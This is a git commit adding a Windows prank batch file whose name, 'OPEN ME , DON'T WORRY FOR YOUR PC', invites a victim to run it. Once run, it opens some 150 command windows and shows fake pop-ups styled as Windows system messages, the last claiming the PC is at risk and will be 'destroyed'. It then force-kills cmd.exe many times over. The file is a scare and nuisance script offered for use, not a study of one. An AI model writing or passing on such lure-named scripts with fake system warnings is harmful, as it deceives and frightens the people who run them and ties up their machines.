4312c941a31bb7f94f9a99d097fbdcd2170bdcbf
LorangoLX <93592274+LorangoLX@users.noreply.github.com>
2022-02-28 10:31:44 +0700

    Add files via upload

---
+++ OPEN ME , DON'T WORRY FOR YOUR PC.bat
@@ -0,0 +1,529 @@
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+MSG * Windows endding spam cmd.exe please wait ....
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+MSG * Windows endding spam cmd.exe please wait ....
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+MSG * Windows endding spam cmd.exe please wait ....
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+MSG * Windows endding spam cmd.exe please wait ....
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+MSG * Windows endding spam cmd.exe please wait ....
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+MSG * Windows have been ended successfully for spam cmd.exe, windows is protect your computer, might be at risk, your pc will be destroyed for lag
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
+taskkill /f /im cmd.exe
